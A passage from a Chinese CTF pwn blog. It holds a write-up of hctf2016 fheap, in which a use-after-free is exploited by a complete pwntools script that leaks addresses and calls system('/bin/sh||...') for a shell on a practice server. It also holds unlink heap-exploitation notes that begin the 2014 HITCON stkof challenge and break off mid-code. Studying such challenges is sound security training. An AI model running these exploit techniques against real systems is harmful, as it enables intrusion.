title="基本情况"></a>基本情况</h4><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled</code></pre><h4 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h4><p>阉割版堆管理器，有增删功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 管理堆的结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> inuse;</span><br><span class="line">    String *str;</span><br><span class="line">&#125; Strings[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 堆结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">String</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">char</span> *buf;</span><br><span class="line">        <span class="keyword">char</span> <span class="built_in">array</span>[<span class="number">16</span>];</span><br><span class="line">    &#125; o;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">void</span> (*<span class="built_in">free</span>)(struct String *ptr);</span><br><span class="line">&#125; String;</span><br></pre></td></tr></table></figure><p>create string 有两种不同方式来储存字符串：</p><ol><li><p>字符串块 &lt; 16 , 在结构体堆块（String）上存放输入的字符串。</p></li><li><p>字符串块&gt;=16 ,  malloc 一个<strong>输入的字符串长度 size</strong> 的空间， 将该空间地址存放在原来的堆块中。</p><blockquote><p>注意是 malloc 输入的字符串长度 ，而不是输入的 size 。自行根据源码分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nbytesa = <span class="built_in">strlen</span>(&amp;buf);</span><br><span class="line"><span class="keyword">if</span> ( nbytesa &gt; <span class="number">15</span> )</span><br><span class="line">&#123;</span><br><span class="line">    dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nbytesa);</span><br></pre></td></tr></table></figure></blockquote></li></ol><p>结构体堆块（String）最后 8 个字节存放的是 free_func 函数地址，用来在 delete 的时候调用，这样的设计与上面例子一致。字符串块两种情况对应两种不同的 free_func 。</p><p>delete string 根据输入下标释放 chunk 。</p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>delete 操作释放 chunk 后，没有将相关索引指针置零，而且没有对 chunk 状态进行严格限制，仅仅限制下标范围，以及查询索引指针是否存在，并没有检查 inuse 位，造成 <strong>UAF</strong>、<strong>Double free</strong> 。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol><li>利用 UAF 控制结构体堆块（String）最后 8 字节，修改 free_func 为 puts 函数地址。释放 chunk 泄露函数真实地址，通过计算得出程序加载基地址。完成绕过 PIE 保护。</li><li>再次 UAF 控制结构体堆块（String）函数地址为 printf 函数，构造出格式化字符串漏洞，泄露栈上位于 libc 段的地址，完成 libc 地址泄露。</li><li>第三次 UAF 控制结构体堆块（String）函数地址为 system 函数，利用 Linux 命令行特性 <code>||</code> 完成 getshell </li></ol><hr><p>UAF 控制思路和例题差不多，但是一个问题。如果使用一样的 UAF 利用方法会出现问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>)</span><br></pre></td></tr></table></figure><p>这样不能达到预期效果，新堆的 string chunk 用的不是 chunk0 结构体，而是继续使用 chunk2 string chunk 。后续试过申请大小各种 string chunk 都是一样情况。</p><p>所以采用申请两个小堆（字符串长度小于 16），然后新堆申请一个 0x20 大小空间存放 string ，这样 string 就会使用 chunk1 结构体堆。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>在 free_short 附近找到 call puts 的地址：0xd2d 。然后使用 partial write 将 free_func 最低一个字节修改为 0x2d 。释放 chunk1 ，将 chunk1 结构体内容输入，从而泄露函数地址，计算出程序加载基地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">call_puts_addr = <span class="number">0xd2d</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(call_puts_addr)[<span class="number">0</span>]</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-call_puts_addr</span><br></pre></td></tr></table></figure><p>释放 chunk0 方便我们重复利用这两个堆，然后重复上面步骤找到 call printf ：0xDBB 。需要将格式化字符串在申请堆时写入在开头。偏移地址 gdb 调试找到一个 libc 内的地址即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;%22$p&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>) + p64(<span class="number">0xDBB</span>)[<span class="number">0</span>]</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这步结束后会卡输入流，输入两行字符即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">&#x27;skye&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;skye&#x27;</span>)</span><br></pre></td></tr></table></figure><p>再次释放 chunk0 并申请，这次将函数地址修改为 system 地址，/bin/sh 输入在开头。由于程序输入函数不能读入 \x00 ，所以用 <code>||</code> 分隔填充内容，原因如下：</p><p>| 分隔符 | 说明                                                         |<br>| &amp;&amp;     | 第2条命令只有在第1条命令成功执行之后才执行                   |<br>| <code>||</code>   | 只有<code>||</code>前的命令执行不成功（产生了一个非0的退出码）时，才执行后面的命令。 |<br>| ；     | 当;号前的命令执行完， 不管是否执行成功，执行;后的命令        |</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : pwn-f.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./pwn-f&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29256</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn-f&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;3.quit\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;create string&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;str:&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;3.quit\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;delete string&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;id:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;sure?:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># UAF</span></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite free_func 2 puts</span></span><br><span class="line">call_puts_addr = <span class="number">0xd2d</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(call_puts_addr)[<span class="number">0</span>]</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-call_puts_addr</span><br><span class="line">log.info(<span class="string">&quot;elf_base:&quot;</span>+<span class="built_in">hex</span>(elf_base))</span><br><span class="line"><span class="comment"># printf_plt = elf_base + elf.plt[&#x27;printf&#x27;]</span></span><br><span class="line"><span class="comment"># log.info(&quot;printf_plt:&quot;+hex(printf_plt))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite 2 printf leak libc</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;%22$p&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>) + p64(<span class="number">0xDBB</span>)[<span class="number">0</span>]</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_addr = leak_addr - <span class="number">0x78c0f</span></span><br><span class="line">log.info(<span class="string">&quot;libc_addr:&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">str_binsh = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.info(<span class="string">&quot;str_binsh:&quot;</span>+<span class="built_in">hex</span>(str_binsh))</span><br><span class="line"><span class="comment"># one = [0x45226,0x4527a,0xf0364,0xf1207]</span></span><br><span class="line"><span class="comment"># onegadget = one[0] + libc_addr</span></span><br><span class="line"><span class="comment"># log.info(&quot;onegadget:&quot;+hex(onegadget))</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;skye&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;skye&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># system(&#x27;/bin/sh||aaa……&#x27;)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh||&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>) + p64(system_addr)</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&#x27;b *$rebase(0x2020C0)&#x27;)</span></span><br><span class="line"><span class="comment"># # gdb.attach(p,&#x27;b *$rebase(0xDBB)&#x27;)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h4><ul><li><p><a href="https://www.cnblogs.com/shangye/p/6156350.html">hctf2016 fheap学习(FlappyPig队伍的解法)</a></p></li><li><p><a href="https://www.cnblogs.com/shangye/p/6156391.html">hctf2016 fheap学习(FreeBuf发表的官方解法)</a></p><p>DlyELF 泄露 libc 地址</p></li><li><p><a href="http://blog.eonew.cn/archives/586#UAFfreeShortputs">hctf2016-fheap Writeup</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unlink学习笔记</title>
      <link href="archives/bea9d64/"/>
      <url>archives/bea9d64/</url>
      
        <content type="html"><![CDATA[<blockquote><p>绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录</p></blockquote><h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。</p><p>我们先来简单回顾一下 unlink 的目的与过程，其目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-09-12-Frn2JF59m2Aeb8tf.png"></p><p>下面我们首先介绍一下 unlink 最初没有防护时的利用方法，然后介绍目前利用 unlink 的方式。</p><h3 id="古老的-unlink"><a href="#古老的-unlink" class="headerlink" title="古老的 unlink"></a>古老的 unlink</h3><p>在最初 unlink 实现的时候，其实是没有对 chunk 的 size 检查和双向链表检查的，即没有如下检查代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><p><strong>这里我们以 32 位为例</strong>，假设堆内存最初的布局是下面的样子</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-09-12-GLmm47iSigCdTg9z.png"></p><p>现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（<strong>比如溢出</strong>）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时</p><ul><li>glibc 判断这个块是 small chunk</li><li>判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</li><li>判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</li><li>继而对 Nextchunk 采取 unlink 操作</li></ul><p>那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下</p><ul><li>FD=P-&gt;fd = target addr -12</li><li>BK=P-&gt;bk = expect value</li><li>FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</li><li>BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12</li></ul><p><strong>总结：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用前提：使用传入参数</span></span><br><span class="line">P-&gt;fd = target<span class="number">-12</span>;</span><br><span class="line">P-&gt;bk = expect value;</span><br><span class="line"><span class="comment">// 作用效果：</span></span><br><span class="line"><span class="comment">// target addr 覆写为 expect value</span></span><br><span class="line">*(target addr) = expect value;</span><br><span class="line"><span class="comment">// expect value 覆写为 target addr -12</span></span><br><span class="line">*(expect value +<span class="number">8</span>) = target addr <span class="number">-12</span>;</span><br></pre></td></tr></table></figure><p><strong>看起来我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要确保 expect value +8 地址具有可写的权限。</strong></p><p>比如说我们将 target addr 设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。<strong>需要注意的是，expect value+8 处的值被破坏了，需要想办法绕过。</strong></p><h3 id="当前的-unlink"><a href="#当前的-unlink" class="headerlink" title="当前的 unlink"></a>当前的 unlink</h3><p><strong>但是，现实是残酷的。。</strong>我们刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们看一下对 fd 和 bk 的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="comment">// FD的下一个chunk是否为P；BK的上一个chunk是否为P；</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br></pre></td></tr></table></figure><p>假如此时 FD、BK 指针内容为：</p><ul><li>FD-&gt;bk = target addr - 12 + 12=target_addr</li><li>BK-&gt;fd = expect value + 8</li></ul><p>那么我们上面所利用的修改 GOT 表项的方法就<del>可能</del>不可用了，但是我们可以通过伪造的方式绕过这个机制。</p><p>首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要</p><ul><li><p><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></p><p>前一个 chunk bk 指向 P </p></li><li><p><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></p><p>后一个 chunk fd 指向 P</p></li></ul><p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p><ul><li><p><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></p><p>前一个 chunk bk 更新为后一个 chunk 地址</p></li><li><p><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></p><p>后一个 chunk fd 更新为前一个 chunk 地址</p></li></ul><p><strong>小结</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 规避检查伪造条件</span></span><br><span class="line"><span class="comment">// fakeFD == P-&gt;fd; fakeBK == P-&gt;bk;</span></span><br><span class="line">*(fakeFD + <span class="number">12</span>) == P;</span><br><span class="line">*(fakeBK + <span class="number">8</span>) == P;</span><br><span class="line"><span class="comment">// unlink 结果</span></span><br><span class="line">*(fakeFD + <span class="number">12</span>) = fakeBK;</span><br><span class="line">*(fakeBK + <span class="number">8</span>) = fakeFD;</span><br></pre></td></tr></table></figure><p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fakeFD + 12 = P;fakeBK + 8 = P;</span></span><br><span class="line">*(fakeFD + <span class="number">12</span>) = *P = fakeBK = P - <span class="number">8</span>;</span><br><span class="line">*(fakeBK + <span class="number">8</span>) = *P = fakeFD = P - <span class="number">12</span>;</span><br></pre></td></tr></table></figure><p>化简后 unlink 结果为：</p><ul><li><code>*P = P - 8</code></li><li><code>*P = P - 12</code></li></ul><p>即通过此方式，<strong>P 的指针指向了比自己低 12 的地址处</strong>。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。</p><blockquote><p>这里指的低 12 是在 32 位系统下，如果是 64 位系统就是 3*8 = 24 。</p><p>归纳起来就是<strong>将 P 指针指向比 P 低 3 个机器周期的地址处</strong></p></blockquote><p>如果我们想要使得两者都指向 P，只需要按照如下方式修改即可</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-09-12-wdgIzUeJnhDHAlgF.png"></p><p>需要注意的是，这里我们并没有违背下面的约束，因为 P 在 Unlink 前是指向正确的 chunk 的指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line"><span class="comment">// 判断当前大小 chunksize 与 nextchunk 的 prev_size 记录值是否一致</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">     malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br></pre></td></tr></table></figure><p><strong>此外，其实如果我们设置 next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果。</strong></p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol><li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li><li>已知位置存在一个指针指向可进行 UAF 的 chunk</li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-09-13-XLVY9VUAkdRn2Wo6.jpg"></p><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-09-13-N8bKV8OpG6TI1wP7.jpg"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>设指向可 UAF chunk 的指针的地址为 ptr</p><ol><li>修改 fd 为 ptr - 0x18</li><li>修改 bk 为 ptr - 0x10</li><li>触发 unlink</li></ol><p>ptr 处的指针会变为 ptr - 0x18。</p><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><blockquote><p>做题环境：Ubuntu 16.04</p></blockquote><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">        </span><br><span class="line">stkof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked</span><br></pre></td></tr></table></figure><p>程序存在 4 个功能，经过 IDA 分析后可以分析功能如下</p><ul><li>alloc：输入 size，分配 size 大小的内存，并在 bss 段记录对应 chunk 的指针，假设其为 global</li><li>fill：根据指定索引，向分配的内存处读入数据，数据长度可控，<strong>这里存在堆溢出的情况</strong></li><li>free_chunk：根据指定索引，释放已经分配的内存块</li><li>print：这个功能并没有什么卵用，本来以为是可以输出内容，结果什么也没有输出</li></ul><h3 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><p>fiil 写入字符长度是由用户决定的，这里就存在一个堆溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">idx = atol(&amp;s);</span><br><span class="line"><span class="keyword">if</span> ( idx &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line"><span class="keyword">if</span> ( !globals[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">size = atoll(&amp;s);</span><br><span class="line">ptr = 